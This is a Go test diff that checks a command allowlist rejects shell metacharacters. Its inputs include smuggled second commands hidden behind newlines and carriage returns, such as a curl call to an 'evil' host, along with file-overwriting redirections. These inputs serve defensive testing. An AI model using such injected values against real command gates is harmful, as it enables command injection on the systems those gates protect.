@@ -177,3 +177,38 @@ func TestResolveExistingPath(t *testing.T) {
 		})
 	}
 }
+
+func TestAllowlist_RejectsNewlineCRAndRedirection(t *testing.T) {
+	allow := []string{"ls", "echo", "cat"}
+	const metaMsg = "shell metacharacters not allowed"
+
+	// The live exploit: a real newline runs a second, unvalidated line.
+	if got := runAllowlist(t, allow, "ls\ncurl http://evil"); !strings.Contains(got, metaMsg) {
+		t.Fatalf("newline bypass: expected metacharacter rejection, got %q", got)
+	}
+	// Carriage return likewise.
+	if got := runAllowlist(t, allow, "ls\rcurl http://evil"); !strings.Contains(got, metaMsg) {
+		t.Fatalf("CR bypass: expected metacharacter rejection, got %q", got)
+	}
+	// Redirection write-primitive (allowed cmd overwriting a file).
+	if got := runAllowlist(t, allow, "echo hi > /tmp/s1_x"); !strings.Contains(got, metaMsg) {
+		t.Fatalf("redirection > not rejected, got %q", got)
+	}
+	if got := runAllowlist(t, allow, "echo hi >> /tmp/s1_x"); !strings.Contains(got, metaMsg) {
+		t.Fatalf("append redirection >> not rejected, got %q", got)
+	}
+	// fd redirection also contains '>' so it is caught too.
+	if got := runAllowlist(t, allow, "cat a 2>&1"); !strings.Contains(got, metaMsg) {
+		t.Fatalf("fd redirection 2>&1 not rejected, got %q", got)
+	}
+	// Sanity: a plain allowed command still passes the policy gate.
+	if got := runAllowlist(t, allow, "ls -l"); got != "" {
+		t.Fatalf("plain allowed command wrongly rejected: %q", got)
+	}
+	// Sanity: input redirection '<' is NOT blocked (deliberate scope boundary);
+	// cat is allowed so policy permits it (it may still fail at runtime if the
+	// file is missing, but it must NOT be a policy rejection).
+	if got := runAllowlist(t, allow, "cat < /etc/hostname"); strings.Contains(got, "metacharacters") || strings.Contains(got, "not in the exec allowlist") {
+		t.Fatalf("input redirection wrongly rejected by policy: %q", got)
+	}
+}
